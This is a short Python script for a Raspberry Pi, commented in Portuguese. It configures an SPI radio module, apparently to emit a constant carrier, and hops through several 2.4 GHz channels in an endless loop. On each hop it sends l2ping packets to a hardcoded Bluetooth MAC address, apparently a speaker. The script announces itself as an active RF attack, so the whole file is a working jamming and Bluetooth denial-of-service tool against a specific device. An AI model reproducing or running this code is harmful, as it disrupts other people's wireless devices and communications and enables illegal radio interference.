import spidev
import os
import time
import RPi.GPIO as GPIO

CE_PIN = 22
COLUNA_MAC = "12:65:4B:38:27:35"

GPIO.setmode(GPIO.BCM)
GPIO.setup(CE_PIN, GPIO.OUT)

# Reset de segurança do rádio interno
os.system("sudo rfkill unblock bluetooth && sudo hciconfig hci0 up")

try:
    spi = spidev.SpiDev()
    spi.open(0, 0)
    spi.max_speed_hz = 800000
    
    GPIO.output(CE_PIN, GPIO.HIGH)
    
    # REGISTOS CRÍTICOS
    spi.xfer2([0x20 | 0x00, 0x0E]) # Power Up
    spi.xfer2([0x20 | 0x01, 0x00]) # No ACK
    spi.xfer2([0x20 | 0x06, 0x92]) 

    print("--- ATAQUE RF ATIVO (MODO ESTÁVEL) ---")
    while True:
        for canal in [2, 26, 40, 60, 80]:
            spi.xfer2([0x20 | 0x05, canal])
            time.sleep(0.1) 
            os.system(f"sudo l2ping -i hci0 -c 1 -s 44 {COLUNA_MAC} > /dev/null 2>&1")

except KeyboardInterrupt:
    print("\nParado.")
finally:
    GPIO.output(CE_PIN, GPIO.LOW)
    spi.close()
    GPIO.cleanup()
